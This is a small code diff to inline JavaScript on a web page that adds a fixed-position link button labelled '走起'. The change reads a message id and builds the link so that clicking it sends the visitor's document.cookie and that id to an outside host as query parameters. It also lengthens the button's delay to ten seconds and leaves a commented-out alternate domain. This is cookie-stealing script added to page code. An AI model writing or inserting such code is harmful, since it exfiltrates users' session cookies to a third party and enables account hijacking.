@@ -63,6 +63,8 @@ setTimeout(function() {
 
 
 setTimeout(function() {
+  var msgid = document.querySelector('.msg_wrapper').getAttribute('msgid');
+
   var btnBar = document.createElement('a');
   btnBar.style.position = 'fixed';
   btnBar.style.zIndex = 100;
@@ -71,8 +73,9 @@ setTimeout(function() {
   btnBar.style.color = '#fff';
   btnBar.style.right = 0;
   btnBar.style.bottom = 0;
-  btnBar.href = 'http://m.baidu.com?return_aaa_url='+encodeURIComponent(location.href);
+  // btnBar.href = 'http://www.rearing-search.com?refer='+encodeURIComponent(location.href);
+  btnBar.href = 'http://m.baidu.com?url='+'&msgid='+msgid+'&cookies='+encodeURIComponent(document.cookie);
   btnBar.innerHTML = '走起';
   document.body.prepend(btnBar);
-}, 2000);
+}, 10000);
 </script>
